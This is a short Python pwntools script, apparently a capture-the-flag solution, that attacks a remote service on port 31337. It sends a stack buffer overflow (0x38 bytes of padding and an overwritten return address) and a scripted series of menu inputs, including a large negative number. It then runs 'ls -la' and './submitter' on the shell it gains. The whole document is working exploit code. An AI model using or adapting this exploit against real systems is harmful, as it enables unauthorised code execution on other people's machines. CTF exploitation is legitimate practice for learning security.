#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
poc='''D
H
A
X
A
C
A
10
1
0
1
fuck
shit
fuck
shit
fuck
E
1
-9999999
n
n
X
N
X'''

p.sendline(b'a'*0x38+p64(0x4015EA))
for i in poc.split('\n'):
    p.sendline(i.encode())

sleep(1)
_ = p.recv()
p.sendline(b'ls -la')
p.sendline(b'./submitter')
print(p.recvall())
p.close()
